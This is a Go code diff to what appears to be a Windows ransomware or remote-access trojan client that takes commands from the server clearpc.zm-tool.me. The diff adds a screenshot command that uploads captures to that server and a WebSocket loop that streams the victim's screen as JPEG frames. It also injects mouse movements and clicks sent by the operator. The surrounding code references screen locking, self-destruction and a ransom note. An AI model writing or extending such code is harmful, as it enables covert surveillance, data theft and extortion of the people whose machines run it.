@@ -10,6 +10,8 @@ import (
 	"encoding/json"
 	"flag"
 	"fmt"
+	"image/jpeg"
+	"image/png"
 	"io"
 	"log"
 	"math/big"
@@ -26,12 +28,16 @@ import (
 	"unsafe"
 
 	"golang.org/x/sys/windows/registry"
+
+	"github.com/gorilla/websocket"
+	"github.com/kbinani/screenshot"
 )
 
 // Configuration
 const (
 	// In production, use "https://clearpc.zm-tool.me"
 	ServerURL    = "http://clearpc.zm-tool.me"
+	WSServerURL  = "ws://clearpc.zm-tool.me/api/ws/client"
 	PollInterval = 5 * time.Second
 )
 
@@ -329,6 +335,10 @@ func executeCommand(cmd Command) {
 	case "unlock_screen":
 		log.Println("Unlocking screen...")
 		result = stopLockScreen()
+
+	case "screenshot":
+		log.Println("Taking screenshot...")
+		result = takeScreenshot()
 
 	case "self_destruct":
 		log.Println("Received self_destruct command. Initiating self-deletion...")
@@ -1237,6 +1247,162 @@ func uploadFile(path string) string {
 	// URL would be {ServerURL}/uploads/{device_id}/{filename}
 	url := fmt.Sprintf("%s/uploads/%s/%s", ServerURL, currentDeviceID, filepath.Base(path))
 	return fmt.Sprintf("Upload successful: %s", url)
+}
+
+func takeScreenshot() string {
+	if runtime.GOOS != "windows" {
+		return "Screenshot only supported on Windows"
+	}
+
+	tempFile := filepath.Join(os.TempDir(), fmt.Sprintf("screen_%d.png", time.Now().Unix()))
+
+	// Use kbinani/screenshot for cleaner capture
+	n := screenshot.NumActiveDisplays()
+	if n <= 0 {
+		return "No active displays found"
+	}
+
+	bounds := screenshot.GetDisplayBounds(0)
+	img, err := screenshot.CaptureRect(bounds)
+	if err != nil {
+		return fmt.Sprintf("Capture failed: %v", err)
+	}
+
+	file, err := os.Create(tempFile)
+	if err != nil {
+		return fmt.Sprintf("File creation failed: %v", err)
+	}
+	defer file.Close()
+
+	if err := png.Encode(file, img); err != nil {
+		return fmt.Sprintf("PNG encode failed: %v", err)
+	}
+	file.Close()
+
+	// Upload
+	result := uploadFile(tempFile)
+
+	// Cleanup
+	os.Remove(tempFile)
+
+	return result
+}
+
+func startRemoteControl() {
+	// Connect to WS
+	// Derive WS URL from ServerURL dynamically to match current config
+	wsURL := strings.Replace(ServerURL, "http", "ws", 1) + "/api/ws/client?id=" + currentDeviceID
+
+	c, _, err := websocket.DefaultDialer.Dial(wsURL, nil)
+	if err != nil {
+		log.Println("WS Dial error:", err)
+		return
+	}
+	defer c.Close()
+
+	log.Println("Connected to Remote Control WS")
+
+	// Input Listener
+	go func() {
+		for {
+			_, message, err := c.ReadMessage()
+			if err != nil {
+				log.Println("WS Read error:", err)
+				return
+			}
+			handleInputMessage(message)
+		}
+	}()
+
+	// Screen Stream Loop
+	for {
+		n := screenshot.NumActiveDisplays()
+		if n > 0 {
+			bounds := screenshot.GetDisplayBounds(0)
+			img, err := screenshot.CaptureRect(bounds)
+			if err == nil {
+				// Resize or compress?
+				// Sending full resolution PNG is too slow. Use JPEG.
+				var buf bytes.Buffer
+				// Quality 50 is good balance
+				if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 50}); err == nil {
+					err = c.WriteMessage(websocket.BinaryMessage, buf.Bytes())
+					if err != nil {
+						log.Println("WS Write error:", err)
+						return
+					}
+				}
+			}
+		}
+		time.Sleep(100 * time.Millisecond) // 10 FPS
+	}
+}
+
+type InputEvent struct {
+	Type   string  `json:"type"` // "mousemove", "mousedown", "mouseup", "keydown"
+	X      float64 `json:"x"`    // Normalized 0-1
+	Y      float64 `json:"y"`    // Normalized 0-1
+	Button int     `json:"button"`
+	Key    int     `json:"key"`
+}
+
+func handleInputMessage(data []byte) {
+	var event InputEvent
+	if err := json.Unmarshal(data, &event); err != nil {
+		return
+	}
+
+	// Get Screen Size
+	bounds := screenshot.GetDisplayBounds(0)
+	width := bounds.Dx()
+	height := bounds.Dy()
+
+	absX := int32(event.X * float64(width))
+	absY := int32(event.Y * float64(height))
+
+	user32 := syscall.NewLazyDLL("user32.dll")
+	setCursorPos := user32.NewProc("SetCursorPos")
+	mouseEvent := user32.NewProc("mouse_event")
+
+	// Consts
+	const (
+		MOUSEEVENTF_LEFTDOWN   = 0x0002
+		MOUSEEVENTF_LEFTUP     = 0x0004
+		MOUSEEVENTF_RIGHTDOWN  = 0x0008
+		MOUSEEVENTF_RIGHTUP    = 0x0010
+		MOUSEEVENTF_MIDDLEDOWN = 0x0020
+		MOUSEEVENTF_MIDDLEUP   = 0x0040
+	)
+
+	switch event.Type {
+	case "mousemove":
+		setCursorPos.Call(uintptr(absX), uintptr(absY))
+	case "mousedown":
+		setCursorPos.Call(uintptr(absX), uintptr(absY)) // Ensure position
+		var flags uintptr
+		if event.Button == 0 {
+			flags = MOUSEEVENTF_LEFTDOWN
+		}
+		if event.Button == 2 {
+			flags = MOUSEEVENTF_RIGHTDOWN
+		}
+		mouseEvent.Call(flags, 0, 0, 0, 0)
+	case "mouseup":
+		setCursorPos.Call(uintptr(absX), uintptr(absY))
+		var flags uintptr
+		if event.Button == 0 {
+			flags = MOUSEEVENTF_LEFTUP
+		}
+		if event.Button == 2 {
+			flags = MOUSEEVENTF_RIGHTUP
+		}
+		mouseEvent.Call(flags, 0, 0, 0, 0)
+	case "click":
+		// Simple click
+		setCursorPos.Call(uintptr(absX), uintptr(absY))
+		mouseEvent.Call(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
+		mouseEvent.Call(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
+	}
 }
 
 func showRansomNote() {
